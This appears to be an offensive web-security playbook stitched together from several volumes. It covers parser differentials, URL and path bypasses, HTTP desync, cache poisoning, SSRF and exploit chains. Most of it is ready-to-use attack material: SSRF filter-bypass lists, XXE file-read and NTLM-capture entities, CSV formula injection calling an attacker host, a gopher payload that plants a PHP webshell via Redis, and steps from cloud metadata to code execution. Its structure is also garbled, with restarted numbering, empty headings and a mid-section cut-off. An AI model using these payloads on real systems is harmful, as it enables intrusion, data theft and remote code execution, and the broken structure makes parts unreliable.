0. How to use this

Most "uncommon tricks" are not exotic bugs. They are ordinary bugs found at a boundary nobody tested, because two components read the same bytes differently. The rare skill is not knowing a payload — it is knowing which two components disagree, and what that disagreement buys you.

Three rules before anything else:

  1. A trick is only worth what its sink is worth. ../ is worthless alone; ../ that reaches proxy_pass $uri is request splitting; request splitting that reaches a cache is account takeover.
  2. Every blind primitive needs an oracle. Build the oracle before the exploit, or you will burn the primitive guessing.
  3. Prefer the boring differential over the clever payload. Host : with a space beats a 400-byte WAF bypass. Nobody patches the boring one.

This volume is the substrate: the differentials, the encodings, the header and body quirks. Volumes 2 and 3 turn them into primitives and chains.

1. Chain algebra

Write every finding as a triple:

SOURCE  →  TRANSFORM  →  SINK
  • Source: the input you control (query, header, filename, JSON key, uploaded byte, DNS name, email address, redirect target).
  • Transform: decode, normalize, truncate, case-fold, re-serialize, template-render, escape, log, cache, hash.
  • Sink: exec, open, file_get_contents, unserialize, eval, include, SQL string, LDAP filter, template compile, HTTP client, Location:, innerHTML, filesystem write.

A finding is only a vulnerability when the transform between source and sink is lossy or asymmetric. Your job in review and in black-box testing is to find the transform that changes meaning.

1.1 The upgrade ladder

Primitives are not equal, and they are not final. Every primitive has a next rung:

Primitive Immediate next rung
Reflected input in a header CRLF → response splitting → cache poison
Blind SSRF Redirect loop / error-path full read → internal API
Arbitrary file read Source → secrets → session forgery
Arbitrary file write Config file / bytecode cache / webshell → RCE
Path traversal (read) Traversal (write) → overwrite a loaded file
SQLi (blind) File read/write via DB → RCE
Open redirect SSRF allowlist bypass, OAuth code theft
Content-type control Stored XSS on a trusted origin → CSPT/CORS pivot
Cache deception Token theft → ATO
Info leak (version/path) Targeted CVE, exact gadget selection
DoS Race window widening, header loss, CSP loss

Always ask "what does this become?" before writing the report. A ../ that only reads /etc/passwd is a low; the same ../ that reaches ~/.ssh/id_rsa is a critical.

1.2 Oracle types

Oracle Signal Cost
Boolean status/body/length differs cheap, noisy
Error stack trace, DB error, template error cheap, often filtered
Timing response latency, render time expensive, needs statistics
Length Content-Length, ETag hex length, padding cheap, precise
Redirect Location present/absent cheap
Sort/order relative ordering of a probe row cheap, underused
Cross-site frame count, onload, cache hit needs victim
Side file Location header, log line, cache entry cheap, persistent

Prefer error and length oracles; they are the most precise per request. Timing is the fallback, not the default.

2. Parser differentials: the master key

Two parsers, one document, two meanings. That is the whole class. It shows up as WAF bypass, auth bypass, cache poisoning, smuggling, XSS, SSRF filter bypass, and RCE.

Where the two parsers live:

  • WAF/CDN vs origin framework
  • Reverse proxy vs application server
  • Framework router vs authorization middleware
  • Validator vs consumer (JSON schema vs json.loads, YAML lint vs yaml.load)
  • Sanitizer vs browser
  • Signature verifier vs attribute reader (SAML, JWT, XML-DSig)
  • Cache key builder vs origin router
  • Front-end JS vs back-end parser
  • Archive lister vs archive extractor
  • File-extension check vs file-type sniffer
  • CLI wrapper vs the tool it invokes

The generic method:

  1. Model the validator's grammar. Find what it cannot represent.
  2. Find a byte sequence the validator accepts as benign but the consumer reinterprets.
  3. Confirm the disagreement with a harmless probe (a canary, a 200-vs-500, a length delta).
  4. Only then weaponize.

Canonical examples worth memorizing:

  • Content-Type: application/json;,text/html — MIME libs split on ; and take the first; Chromium/Firefox split on , and take the last valid type. Passes a JSON check, renders as HTML despite nosniff. (Parse and Parse)
  • Duplicate JSON keys — validators that JSON.parse and take first-wins vs consumers that take last-wins (or vice versa). Also __proto__ vs constructor.prototype.
  • YAML << merge keys and explicit !!merge resolve differently across Go/Ruby/Node/Python. (YAML Merge Tags)
  • ZIP entry names: the lister uses one API, the extractor another; a traversing name is invisible to the check and honoured by the write. (Disguises Zip Past Path Traversal)
  • XML round-trip: parse then re-serialize changes the document, so the signature covers something else. (SAML roulette)
  • Nginx $uri is normalized and URL-decoded, so %0d%0a in the path injects headers into the upstream request. (CRLF-Powered Desync)

Tooling: http-garden differential-fuzzes HTTP servers/proxies side by side; WAF Manis does it for WAF-vs-framework; diff two parsers locally for anything else.

3. URL parsing

URLs are the highest-yield differential surface on the web: every SSRF filter, allowlist, redirect check, cache key, and signature is built on a URL parser, and every one of them disagrees with the next.

3.1 Authority confusion

https://expected.com@attacker.com/          # userinfo; browser goes to attacker.com
https://attacker.com#@expected.com          # fragment hides the real host from naive regex
https://expected.com\.attacker.com          # backslash read as "/" by Chrome, as a char by many libs
https://expected.com%2f@attacker.com        # encoded slash inside userinfo
https://attacker.com?@expected.com          # "?" before "@"
http://127.0.0.1:80@attacker.com            # port inside userinfo
https://attacker.com:443@expected.com

Any validator doing url.startswith("https://expected.com") or "expected.com" in url falls to the first, second, or fifth form.

3.2 Loopback and internal-address spellings

http://127.0.0.1/            http://127.1/
http://2130706433/           # decimal
http://0x7f000001/           # hex
http://0177.0.0.1/           # octal
http://[::1]/                http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:7f00:1]/
http://127.0.0.1.nip.io/     http://127.0.0.1.sslip.io/
http://localhost./           # trailing dot
http://LOCALHOST/
http://127.0.0.1:80#@attacker.com

Also: http://0/ (Linux resolves to 0.0.0.0 → localhost on many stacks), http://[::]/, http://169.254.169.254.nip.io/, and http://metadata.google.internal/.

3.3 Scheme confusion

http:attacker.com                 # no slashes
https:/\/attacker.com             # mixed slashes
//attacker.com                    # protocol-relative
http:///attacker.com              # triple slash: Python urlsplit sees no netloc
http://attacker.com\@expected.com
javascript:alert(1)//https://expected.com
java\nscript:alert(1)             # tab/newline inside the scheme

http:///host is the important one: Python's urlsplit returns netloc='' and path='/host', so a validator sees a relative path while the fetcher resolves a host. (Jupyter token leak)

U+2028 inside a scheme token splits the string for the checker but not the resolver — this survived Chrome's Sanitizer API. (Two Bypasses for Chrome's Sanitizer API)

3.4 Credentials and CRLF

http://user%0d%0aX-Injected:%20yes@host/
http://user:pass@host/
http://a:b:c@host/                # second ":" — parsers disagree on the password

CRLF in the userinfo reaches servers that build an Authorization: Basic header or a proxy request line from the parsed parts. Same trick reaches Proxy-Authorization in forward proxies.

3.5 Redirect-chain tricks

  • Loop to error: a redirect loop that walks the status code up through 3xx drives a client into its error path, which often returns the full response body where success returned nothing. (Novel SSRF Technique Involving HTTP Redirect Loops)
  • 307/308 preserve method and body: use an image proxy or CDN endpoint as a redirect gadget to move a POST (with its body) to a sibling host. (Cloudflare Image Proxy as a CSPT Gadget)
  • Redirect to file:///gopher://: many HTTP clients follow a 30x into a non-HTTP scheme.
  • Redirect to yourself with a different Host: splits what the allowlist checked from what is fetched.

Full payload corpus: URL Validation Bypass Cheat Sheet.

4. Path normalization and routing

Path handling is where front-end ACLs die. The proxy matches a prefix; the backend resolves a different file.

4.1 Traversal that survives checks

..%2f            ..%2F            %2e%2e%2f
..%252f          %252e%252e%252f  # double-encoded, decoded twice downstream
..\              ..\\             # Windows
....//           ....\/           # naive strip-one-layer filters
..%c0%af         ..%c0%2f         # overlong UTF-8
..%e0%80%af

4.2 Segment tricks

/admin/..;/admin/panel        # Tomcat semicolon path params
/..;/admin                    # proxy sees /..;/, Tomcat strips it
/.;/admin
/admin;jsessionid=x/../panel
//admin//panel                # duplicate slashes
/admin/.                      # trailing dot segment
/admin%20                    # trailing space (Windows trims)
/ADMIN                        # case-insensitive FS
/admin.php%3Ffoo.php          # Apache truncates r->filename at encoded "?"
/admin.php/foo.php            # PATH_INFO
/admin.php;.css
/admin/../admin/panel

/..;/ is the canonical auth-bypass primitive against Tomcat/Spring behind Nginx. (Breaking Parser Logic)

admin.php%3Fooo.php works because mod_rewrite treats r->filename as a URL and truncates at ?, so <Files admin.php> auth never matches, while PHP-FPM splits the ? back off and runs admin.php. (Confusion Attacks)

4.3 Static-file fallthrough

/admin/panel/logo.png     # cache deception
/admin/panel.json
/admin/panel/
/admin/panel%00.css
/admin/panel/..%2fpanel

Any route that appends a "static" suffix and still resolves the dynamic handler is a cache-deception candidate. The mirror case is a static handler that resolves up into the app root.

4.4 Java-specific routing

Java stacks resolve ; matrix params, %2F, and encoded dots differently from every proxy in front of them. UABScan found 94 auth-bypass candidates across 529 apps from exactly this. (paper)

5. Encoding, Unicode, charset

5.1 Charset omission

A Content-Type without charset lets the browser auto-detect. Injecting an ISO-2022-JP escape sequence flips the assumed charset mid-body, so the byte you used to escape a quote renders as something else. (Encoding Differentials)

<meta charset="iso-2022-jp">  <!-- or inject ESC $ B -->

5.2 Best-fit / narrowing

Windows converts UTF-16 to ANSI with best-fit mappings after escaping:

Unicode ANSI byte Effect
U+FF02 fullwidth quote " closes a quoted argument
U+00A5 yen \ becomes a path separator
U+2015 horizontal bar —→- option confusion
soft hyphen U+00AD - option confusion

escapeshellarg() and list2cmdline() escape first; GetCommandLineA/CRT converts second, undoing the escape. (WorstFit)

Java has the mirror bug: (byte) ch and ch & 0xFF drop the high 8 bits ("ghost bits"), so a fullwidth character whose low byte is ' passes a WAF as Unicode and becomes a quote at the sink. (Cast Attack)

5.3 Normalization

  • NFC/NFD: é as one codepoint vs e+combining accent — different byte lengths, different hash, same glyph.
  • Case folding: İ (U+0130) lowercases to two codepoints in JS, one in ICU. A blocklist on i misses it. (FCSC 2026)
  • Confusables: Cyrillic а, Greek ο, ⅼ (Roman numeral fifty) in identifiers and domains.
  • ß → ss under some folds; Turkish dotless ı.

5.4 Truncation

  • Mid-sequence UTF-8 truncation leaves a dangling lead byte that swallows the next character.
  • 255-byte filename limits, 4096-byte header limits, 8 KB request-line limits: pad to truncate a suffix check.
  • %00 truncates C strings: shell.php%00.jpg, admin%00.html.

5.5 Overlong encodings

%c0%ae = ., %c0%af = /, %c1%9c = \. Decoders that accept overlong forms disagree with decoders that reject them.

6. Content-Type and MIME

6.1 Comma lists

Content-Type is a singleton field, but parsers disagree:

  • MIME libraries: split at first ;, keep first type.
  • Chromium/Firefox: split on ,, keep last syntactically valid type.
Content-Type: application/json;,text/html
Content-Type: image/png,text/html
Content-Type: text/plain,text/html
Content-Type: application/json, text/html; charset=utf-8

This defeats prefix, suffix, regex, and substring allowlists and survives X-Content-Type-Options: nosniff. (XSS using dirty Content Type)

6.2 Duplicate headers

Two Content-Type headers: the framework takes the first, the WAF the last, or the reverse. Same for Content-Disposition, Content-Length, Transfer-Encoding.

6.3 Sniffing

  • IE sniffs text/plain and message/rfc822 (.eml) — HTML inside renders. (Text/Plain Considered Harmful)
  • Chrome sniffs some types when nosniff is absent; the comma trick works even when it is present.
  • Object storage lets you set the type on upload: text/html on a public bucket is stored XSS on the bucket origin. On S3 you need a signed request; on MinIO an anonymous override suffices. (Content-Type Override to Stored XSS)

6.4 Charset in multipart

A harmless charset in a later multipart part overwrites the captured value from an earlier dangerous one in OWASP CRS. (CVE-2026-21876)

6.5 Disposition

Content-Disposition: inline renders; attachment downloads. A filename with %0d%0a splits the header. filename*= (RFC 5987) and filename= can disagree, so the validator checks one name and the disk gets the other.

7. Header-level tricks

7.1 Duplicates and precedence

Host: expected.com
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-Proto: https
X-Forwarded-Port: 443
X-Real-IP: 127.0.0.1
Forwarded: for=127.0.0.1;host=attacker.com;proto=https
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Prefix: /admin

Different layers take the first, the last, or join with ,. X-Forwarded-Host reaching an absolute-URL builder is password-reset poisoning; reaching a router is auth bypass.

7.2 Whitespace and folding

Host : expected.com          # space before colon
Host:  expected.com          # double space
Host:\texpected.com          # tab
Host: expected.com\t
X-Foo: a
 b                            # obs-fold continuation

Folded headers hide a payload from a WAF that reads one line while the backend unfolds it. (Exploiting HTTP Parser Inconsistencies)

7.3 Bare CR and bare LF

Some parsers split on \n alone, some on \r\n, some on \r. A bare CR inside a value ends the header for one layer and not the other. This is the basis of SMTP smuggling and several header-injection bypasses.

7.4 Trailers

Trailer: X-Admin
TE: trailers
...
0
X-Admin: true

Trailers are merged into the header section by ~a third of implementations, bypassing proxy ACLs and vhost checks that only inspect the header block. (Trailing Danger)

7.5 Framing headers

Transfer-Encoding: chunked
Transfer-Encoding: chunked, chunked
Transfer-Encoding: gzip, chunked
Transfer-Encoding: identity, chunked
Content-Length: 0
Content-Length: 5
Content-Length: 5, 5

See Vol. 2 §11 for exploitation.

7.6 Internal framework headers

x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
x-now-route-matches: 1
Rsc: 1
Next-Router-State-Tree: ...
X-Middleware-Prefetch: 1

These make Next.js skip middleware (auth bypass) or serve a static/cacheable variant (poisoning). (corrupt middleware, stale elixir)

7.7 Conditional headers as oracles

If-None-Match: "etag"
If-Match: *
Range: bytes=0-1
If-Range:

If-None-Match echoes the ETag back, and the ETag often encodes length in hex — a one-byte length oracle that needs no body read. (Cross-Site ETag Length Leak)

8. Body formats

8.1 JSON

{"a": "safe", "a": "<img src=x onerror=alert(1)>"}     // duplicate key
{"__proto__": {"isAdmin": true}}                        // prototype pollution
{"constructor": {"prototype": {"isAdmin": true}}}       // when __proto__ is stripped
{"a": {"b": {"c": "..."}}}                              // nested merge → class pollution

Duplicate-key order matters: JSON.parse keeps the last; many validators keep the first; PHP's json_decode keeps the last. Python keeps the last. Go keeps the last. Java's Jackson keeps the last by default but fails on duplicates if configured. Test both directions.

8.2 YAML

a: &x {admin: true}
b:
  <<: *x
base: !!merge

a: !!binary "cHJpbnQgJ2hpJw=="

Unsafe loaders: !!ruby/object, !!python/object, !<tag:yaml.org,2002:...>. yaml.load without SafeLoader is RCE in Ruby and Python.

8.3 XML

<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>

<xi:include href="file:///etc/passwd" parse="text" xmlns:xi="http://www.w3.org/2001/XInclude"/>

Namespace confusion: two xmlns declarations for the same prefix; the signature verifier resolves one, the attribute reader the other. Round-trip mutation: &#x2e; vs ., CDATA vs text, attribute order.

8.4 Multipart

--b
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: image/png

<?php ... ?>
--b
Content-Disposition: form-data; name="file"; filename="b.php"

...
--b--

Quirks: duplicate name, duplicate filename, unquoted filename, missing final boundary (PHP accepts), CRLF inside the filename, filename* vs filename, broken CRLF between headers and body, extra part after the terminator. (Breaking Down Multipart Parsers)

8.5 Form encoding

a=1&a=2                 # duplicate: last wins in most, array in PHP/Express-extended
a[]=1&a[]=2             # array
a[b]=1                  # nested
a[b][c]=1               # deep

PHP mangles names: . → _, space → _, [ → _. So a.b and a_b collide, and a[b becomes a_b. That collision is a validation bypass when one layer checks a.b and the app reads a_b. (Abusing PHP query string parser)

Parameter count limits: PHP max_input_vars (default 1000) silently drops the tail — and emits a warning before the headers, so Content-Type, CSP, and Cache-Control are never sent. (Secret Web Hacking Knowledge)

8.6 CSV

=cmd|' /C calc'!A0
=HYPERLINK("http://attacker/?"&A1,"x")
@SUM(1+1)*cmd|' /C calc'!A0

Server-side CSV export → formula execution on the analyst's machine. Also sep=; and UTF-8 BOM to change the delimiter.

8.7 Binary formats

Protobuf field numbers, MessagePack type tags, CBOR tags, PHP S: lengths, Java serialVersionUID. A type-confusion here is a full object-injection primitive. (MessagePack typeless)

9. Length, NUL, and integers

  • NUL truncation: %00, \0, 0x00. Kills suffix checks, C-string APIs, and some regex engines.
  • Length-field overflow: a 4 GB parameter overflows the 4-byte message length in MySQL/Postgres drivers, so the tail is parsed as a new protocol message — SQL injection past prepared statements. (SQL Injection Isn't Dead)
  • Integer underflow in path length: nginx WebDAV alias arithmetic underflows on crafted DELETE/COPY, escaping the root. (CVE-2026-27654)
  • Off-by-one in escape buffers: snprintf return value used as length → over-read of adjacent memory (Citrix Bleed). (CVE-2023-4966)
  • Truncation to a fixed buffer: pad until the security-relevant suffix is cut.

For every endpoint, list the parsers in the path and pick the pair most likely to disagree:

  1. CDN/WAF ↔ origin framework

  5. Sanitizer ↔ renderer

1. SSRF

SSRF is the highest-leverage server-side primitive because it converts "the server trusts its own network" into everything else. The uncommon part is not finding it — it is getting the response back and reaching non-HTTP services.

1.1 Where SSRF hides

Not just ?url=. Look for:

  • Image/thumbnail/avatar fetchers, "import from URL", "add by link"
  • PDF/HTML-to-image renderers, screenshot services, link previews, oEmbed
  • Webhook registration + test-fire, "validate endpoint", status callbacks
  • RSS/Atom import, OPML, sitemap ping, feed readers
  • Office/PDF/EPUB converters, subtitle and font fetchers
  • Package/registry proxies, Maven/NPM/Composer/PyPI mirrors
  • Git/Subversion/Mercurial "import repository" (git can fetch ext::, http::)
  • SSO/OIDC jwks_uri, logo_uri, request_uri, SAML metadata URL, ACS URL
  • CI runners, preview deployments, "deploy from Git URL"
  • Backup/restore "from S3/URL", migration wizards
  • Elasticsearch/Kibana "remote cluster", Grafana datasource, Prometheus target
  • WSDL/XSD import (SOAP), XSLT document(), XML external DTD
  • Anything that takes a hostname: SMTP host, LDAP host, DB host, proxy settings

1.2 Full-read vs blind

  • Full-read: the body is returned or rendered (preview, thumbnail, PDF text, oEmbed JSON). Trivial.
  • Blind: only success/failure. Then:
  • Redirect loop → error path: a loop that increments 3xx until the client errors often returns the whole body on the error page. (redirect loops)
  • file:// redirect: if the client follows to file://, local files become readable.
  • Error text reflection: point at a port that returns a banner (SSH, SMTP, Redis) — the parse error often quotes it.
  • Timing: open vs closed port; 10.0.0.1:22 fast RST, filtered port times out.
  • Content-length side channel: some clients differ on Content-Length: 0 vs large.

1.3 Filter bypass

All of Vol. 1 §3 applies: @, #, \, %2f, http:///, decimal/octal/hex IPs, IPv6, nip.io, trailing dot, 0.

More:

http://expected.com.attacker.com/
http://attacker.com/expected.com
http://expected.com%2eattacker.com
http://expected.com:80@attacker.com
http://expected.com#@attacker.com
http://[::ffff:169.254.169.254]/
http://169.254.169.254/latest/meta-data/#@attacker.com
  • DNS rebinding: your domain returns a public IP first (passes the check), then 127.0.0.1 on the second query (TTL 0). Beats "resolve then check" filters.
  • Redirect to internal: register a 302 to http://127.0.0.1:8500/. Most clients follow and do not re-validate.
  • Allowlist suffix: expected.com.attacker.com when the check is endswith("expected.com").
  • Wildcard DNS: 127.0.0.1.nip.io, 169.254.169.254.sslip.io, localtest.me.

1.6 SSRF → RCE chains

  • Metadata creds → aws sts → S3/Lambda/SSM → code execution
  • Metadata creds → cloud API → create a new compute resource with a startup script
  • Docker API → bind-mount / → chroot container → root
  • Redis → CONFIG SET dir /var/www/html → SAVE → webshell
  • FastCGI → SCRIPT_FILENAME + PHP_VALUE auto_prepend_file=php://input
  • Jolokia/ActiveMQ → add a connector with a vm:// URI → remote Spring XML → command exec (CVE-2026-34197)
  • Internal admin API with no auth → create user / reset password / toggle debug

1.7 SSRF without a server

  • Browser-side SSRF: fetch to http://127.0.0.1:port from a page — CORS blocks reading, but no-cors + timing/onload still works, and DNS rebinding removes CORS entirely.
  • PDF/HTML renderer SSRF: <img src>, <link rel=stylesheet>, @font-face, <iframe>, XSLT document().
  • Email client SSRF: List-Unsubscribe becomes a server-side request in Nextcloud Mail. (Turning List-Unsubscribe into an SSRF/XSS Gadget)

5. SQL injection, beyond the obvious

5.1 Prepared statements that are not

  • PDO emulation (default on): a NUL byte makes PDO's own scanner abandon a backtick identifier, so a ? inside a column name becomes a bound parameter and a second value is substituted raw. (Searchlight)

  • mysql2: arrays/objects become SQL fragments by default. (Prepared to Be Vulnerable)
  • Protocol-level smuggling: a ~4 GB parameter overflows the 4-byte length field; the tail is parsed as a new message. (SonarSource)

5.2 Injection points nobody tests

10. Cache attacks

10.1 Poisoning

Find an input the cache excludes from its key but the origin reflects. Classic unkeyed: X-Forwarded-Host, X-Forwarded-Scheme, X-Host, X-Original-URL, X-Rewrite-URL, Forwarded, X-Forwarded-Port, Accept-Encoding variants.

GET / HTTP/1.1
Host: expected.com
X-Forwarded-Host: attacker.com

If the origin builds an absolute URL or a Location from it, the cached copy redirects everyone.

More exotic:

  • Cache key injection: ambiguous key boundaries (delimiters, ;, %00, duplicate query params) map two requests to one entry. (Cache key injection)
  • Framework internals: Next.js x-now-route-matches + __nextDataReq store pageProps JSON under an HTML key. (stale elixir)
  • Type confusion: a cached RSC response re-rendered as HTML because Vary ignores Content-Type. (Re:CACHE)
  • Cache the Location: CL.0 desync poisons a redirect header, giving a covert channel. (Quiet Side Channel)
  • Conditional poisoning: If-None-Match/If-Modified-Since make the cache store a 304 for a URL that later needs a 200.

10.2 Deception

Append a static-looking suffix to a dynamic, authenticated page. The cache stores it under the static key; you fetch it unauthenticated.

/account/logo.png
/account/..%2faccount
/account;.css
/account%00.css
/account/logo.avif

The %2f and ..%2f variants survive caches that decode and normalize differently from the origin — that was the ChatGPT ATO. (Wildcard Web Cache Deception)

10.3 Cache as a side channel

  • Hit/miss timing tells you whether a URL is cached → whether a victim visited it.
  • Age header presence, X-Cache: HIT.
  • ETag length as a cross-site length oracle. (ETag leak)

10.4 Cache as storage

Poison a URL with your payload, then reference it from a context that trusts the origin. Cache entries persist after the origin is fixed, which is useful for stored XSS on a trusted domain.

11. HTTP desync

Desync is the most powerful server-side primitive and the most misunderstood. It is not "send two requests"; it is make two parsers disagree about where a body ends.

11.1 Variants

Name Front end Back end
CL.TE Content-Length Transfer-Encoding
TE.CL Transfer-Encoding Content-Length
TE.TE obfuscated TE different obfuscation handling
CL.0 Content-Length ignores body
TE.0 Transfer-Encoding ignores body

Obfuscations: Transfer-Encoding: chunked, chunked, xchunked, Transfer-Encoding : chunked, Transfer-Encoding:\tchunked, duplicate TE, Content-Length: 5, 5.

11.2 Chunk parsing quirks

  • A bare \n inside a chunk extension: one parser ends the line, the other swallows it.
  • Two bytes blindly skipped as the chunk terminator: one parser consumes a byte of the next size.
  • A bare newline in the trailer section splits the same way.
  • Oversized chunk sizes and 0x prefixes.

(Funky chunks, addendum)

11.3 CRLF in the path

When proxy_pass includes $uri, Nginx normalizes and URL-decodes it, so %0d%0a in the path injects headers or a whole request upstream. Adding Transfer-Encoding next to the real Content-Length gives a CL.TE; two CRLFs split the request for response-queue poisoning. (CRLF-Powered Desync)

11.4 HTTP/2 and HTTP/3

  • H2.CL: a content-length header that disagrees with the actual DATA length, downgraded to H1.
  • H2 CONNECT: tunnels multiplexed on one stream — fast internal port scanning through a proxy. (Playing with HTTP/2 CONNECT)
  • H3 FIN: a standalone QUIC FIN ends an H3 body without the DATA length check, so the backend reads the next request as body. (CVE-2026-33555)
  • Connection contamination: coalesced H2/H3 connections to a shared IP+cert, plus a proxy that picks the backend from the first request, misroutes everything after. (HTTP/3 connection contamination)

11.5 Exploitation outcomes

  • Bypass front-end controls: reach an admin path the proxy blocks, skip rate limits, skip auth on the second request.
  • Capture other users' requests: the classic prefix attack.
  • Response queue poisoning: misalign responses so you receive someone else's.
  • Cache poisoning via the smuggled prefix.
  • Tunnelling: smuggle a request to an internal host through a whitelisted front end — this is how XXE behind an egress firewall still exfiltrates. (XXE-scape)
  • Client-side desync: the browser holds the poisoned connection, so the next request the victim's browser makes is the attack. (client-side desync)

11.6 Making it reliable

Desync is a race. The single-packet attack sends all requests in one TCP segment (or one QUIC packet) so the server processes them simultaneously; last-byte sync withholds the final byte of each. This turns a ~1/2000 race into ~80% hits. (Single-Packet Shovel, Beyond the Limit)

12. Race conditions

12.1 The real class

Not just "double-spend". Every request passes through hidden sub-states, and two requests in the same millisecond can force an illegal transition:

  • Confirm an email you do not own by racing the confirm and the email change
  • Redeem a coupon/invite twice
  • Bypass a limit by racing the counter
  • Register the same username twice, then take over the first
  • Race /proc/self/fd between stat and open to read a file whose length check fails
  • Race a symlink between check and use (TOCTOU)
  • Race an upload's temporary file against a parser

12.2 Database-level races

Read-check-write inside a transaction is still racy at default isolation — the read takes no lock. Parallel requests all pass the check. (A Race to the Bottom)

12.3 Tools

Turbo Intruder single-packet, race-the-web, HTTP/3 single-datagram, and a plain xargs -P for wide windows. Always send a control pair serially to prove the difference.

13. DoS as a chain element

DoS is under-used as a component:

  • Header loss: PHP max_input_vars overflow emits a warning before headers → no CSP, no Content-Type, no Cache-Control. Combined with injection that is an XSS.
  • Force an error page: cookie bomb, overlong URL, WAF trigger — error pages often lack nosniff and CSP.
  • Widen a race window: expensive regex or a slow query in one branch makes the other branch win.
  • Evict a cache: fill the cache past its limit to force LRU eviction and claim the entry. (Angular compromise)
  • Exhaust a worker pool: reserve all PHP-FPM workers so a request lands in a predictable one.

Specific amplifiers: ReDoS, HPACK bomb, HTTP/2 CONTINUATION flood, Rapid Reset, MadeYouReset, slow JSON stream, decompression bomb, nested FormData rescan, algorithmic complexity in sort/hash.

  • Docker socket /var/run/docker.sock or :2375: create a container with --privileged -v /:/host.

  • pull_request_target + checkout of the PR head: the workflow runs with secrets and the PR's code.

16. Primitive hygiene

Before you escalate, verify:

  1. Is it real? A control request without the payload, from a different connection, same result?
  2. Is it stable? Three consecutive confirmations.
  3. Is it yours? Another tester's cache entry, another user's session, a shared worker.
  4. What is the blast radius? Read-only, write, execute, cross-tenant.
  5. Can you undo it? Especially for writes, cache poison, and DNS.

1. Building oracles

A blind primitive without an oracle is a guess. Build the oracle first, then spend the primitive.

1.1 Oracle selection

Situation Oracle to build
Response body differs at all Substring match on a known-good vs known-bad byte
Body fixed, status varies Status code (200/302/500)
Body and status fixed Content-Length delta
Length fixed too Timing (add sleep, expensive regex, large sort)
No response at all OOB: DNS, HTTP callback, SMB
Output truncated Binary search on prefix, or sort/order
Output digits only Base-N encode then chunk into an integer
Cross-origin Cache hit/miss, frame count, onload, ETag length

1.2 Boolean oracles

Make the condition the whole query, not a suffix:

' AND (SELECT substr(secret,1,1) FROM t)='a' AND '1'='1

Prefer substr + = over LIKE (wildcards in the secret break LIKE). Prefer a binary search over an alphabet scan: ascii(substr(...))>127.

1.3 Error oracles

Force a type error only when the predicate is true:

1/(SELECT 1 FROM t WHERE substr(secret,1,1)='a')
CAST((SELECT ...) AS int)

Error oracles survive output buffering and are the fastest per request. They die to display_errors=Off and generic error pages — check first.

1.4 Timing oracles

Only when nothing else works. Ten samples per state, take the median, use a 3× margin. Amplify with nested work (pg_sleep(2), BENCHMARK(10^7,MD5(1)), a catastrophic regex, a large ORDER BY).

1.5 Sort and order oracles

Insert the target as a hidden participant in a sort you control, then read relative position from a probe row. Works where the value itself is never returned. (Trello)

1.6 Length oracles

Content-Length differences, ETag hex length stepping across a digit boundary, compressed-size deltas, padding that pushes a header past a limit into a 431. (ETag length leak)

1.7 Cross-site oracles

  • window.length (frame count), onload/onerror, performance timing
  • Cache hit (Age, X-Cache, timing)
  • CORB/ORB behaviour: a JSON response errors as a script, HTML loads
  • Redirect race ordering by port/scheme/host (XSS-Leak)
  • CSS: attribute selectors + background:url() for character extraction; @font-face descent-override + animation for a height oracle when requests are blocked (CSS: the bomb inside your inbox)

1.8 OOB channels, ranked

  1. DNS — survives almost every egress filter, cheap, works from SQL/XXE/command/SSTI. Use a unique label per bit.
  2. HTTP(S) to your host — blocked more often; try 80/443/8080/8443.
  3. SMB — also yields NTLM hashes.
  4. FTP — for XXE on Windows (multi-line via UNC).
  5. The target's own logs — write the secret into a log you can read back.
  6. A cache entry — store the secret under a URL you can fetch.
  7. A public paste/issue/comment — when you have an account.

2. Exfiltration under constraints

2.1 Numeric-only output

Encode to base-36 (alphanumeric) or base-27 (letters+space), then express as one large base-10 integer and chunk. (numeric-only exfil)

2.2 Fixed-width or truncated output

Send one character per request with a prefix binary search. If the prefix itself is cut, rotate the offset.

2.3 No output, no egress

  • Write to a file you can then read (two primitives).
  • Write into a cache entry.
  • Encode into a Location header you can observe via a redirect chain.
  • Encode into response time.
  • Encode into status code (multi-valued alphabet).

2.4 Size limits

Chunk at 30–60 bytes per request, base64 the payload, compress first (gzip | base64) and decompress locally. For DNS, 63 bytes per label and ~253 per name.

3. Chain playbooks

Each is a composition, not a single bug. Read the shape, then map it onto the target.

3.1 SSRF → cloud → RCE

URL fetch → 169.254.169.254 (or metadata.google.internal/v1beta1)
→ role name → credentials JSON
→ aws sts get-caller-identity → enumerate
→ ssm send-command | lambda update-code | create-instance with user-data

Pivot points: IMDSv2 via a redirect that adds headers, or an internal proxy. (#341876)

3.2 SSRF → Redis → webshell

gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html%0d%0aCONFIG SET dbfilename s.php%0d%0aSET x "<?php system($_GET[c]);?>"%0d%0aSAVE

Then request /s.php?c=id. If Redis runs as a different user, check the webroot is writable first.

3.3 SSRF → FastCGI → RCE

gopher to :9000, SCRIPT_FILENAME=/var/www/html/index.php, PHP_VALUE=auto_prepend_file=php://input, then the body is executed.

3.4 Blind SSRF → full read

attacker/loop → 302 to attacker/loop2 → ... (status climbs 301→308)
→ client error path returns the whole chain + final body

(redirect loops)

3.5 File read → session forgery

traversal → .env / config.php / appsettings.json
→ APP_KEY / SECRET_KEY_BASE / machineKey / JWT secret
→ forge a signed cookie or ViewState → admin

Laravel APP_KEY → phpggc + decrypt/encrypt; Rails SECRET_KEY_BASE → Marshal cookie; Django SECRET_KEY → signed session; ASP.NET machineKey → ysoserial.net ViewState.

3.6 File read → RCE via wrapper

include($_GET['p']) + php://filter chain → prepend "<?php system($_GET[c]);?>"

(PHP filter chains)

3.7 File write → config → RCE

upload/write application.properties (Spring) or logback-spring.xml
→ trigger reload/restart (actuator/refresh, or wait)
→ logging appender executes a command

(Spring properties)

3.8 Upload → polyglot → parser

valid JPEG + PHP in a comment/EXIF/PLTE chunk
→ survives re-encoding by GD/Imagick
→ included or served as PHP

(PHP payloads in PNGs, polymorphic images)

3.9 XXE → SSRF → internal RCE

XXE with a parameter entity to an internal host
→ internal admin API with no auth → deploy/exec

Behind an egress firewall, add desync tunnelling through a whitelisted host. (XXE-scape)

3.10 XXE → NTLM → relay

\\attacker\share in the entity → responder captures NTLMv2 → ntlmrelayx to LDAP/SMB → domain account. (XXE to NTLM)

3.11 Desync → cache poison → XSS

